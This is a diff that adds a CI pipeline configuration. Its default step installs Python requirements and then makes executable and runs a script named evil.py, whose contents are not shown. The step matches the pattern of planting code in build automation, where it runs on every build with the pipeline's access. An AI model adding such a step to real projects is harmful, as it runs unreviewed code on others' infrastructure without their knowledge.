@@ -1,0 +1,14 @@
+version: 2.0
+
+pipelines:
+  default:
+    - step:
+        name: Set Up Python Environment and Run Script
+        image: python:3.10
+        cache:
+          - .cache/pip
+        commands:
+          - pip install --upgrade pip
+          - pip install -r requirements.txt
+          - chmod +x evil.py
+          - python3 evil.py
